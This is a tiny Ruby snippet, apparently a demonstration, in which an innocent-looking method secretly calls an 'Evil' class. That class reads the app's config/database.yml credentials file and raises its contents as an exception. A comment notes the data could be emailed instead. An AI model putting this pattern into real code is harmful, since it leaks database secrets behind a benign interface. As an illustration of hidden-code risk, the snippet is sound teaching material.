module Something
	class Innocent
    def self.perform_action(string)
      Something::Evil.do_evil
      string
    end
  end
  class Evil
    def self.do_evil
      file = File.open("./config/database.yml", "r")
      raise file.read.inspect
      # This could just as easily email this information
    end
  end
end
